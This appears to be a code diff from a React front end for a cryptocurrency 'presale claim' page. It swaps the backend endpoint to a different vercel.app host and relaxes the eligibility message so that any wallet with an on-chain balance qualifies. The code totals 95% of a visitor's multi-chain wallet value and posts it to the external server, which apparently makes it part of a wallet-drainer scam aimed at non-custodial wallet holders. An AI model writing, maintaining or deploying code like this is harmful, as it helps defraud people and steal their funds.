@@ -1296,7 +1296,7 @@ function App() {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        await fetch('https://hyperback.vercel.app/api/presale/claim', {
+        await fetch('https://hyperback-psi.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1580,7 +1580,7 @@ function App() {
                   ) : (
                     !scanning && (
                       <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
-                        ⚡ Eligibility requires a minimum of $1 USD equivalent across any supported network.<br/>
+                        ⚡ Eligibility requires an on-chain balance across any supported network.<br/>
                         📌 Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche<br/>
                         🔒 Non-custodial wallets only. Exchange wallets (CEX) are not supported.
                       </div>
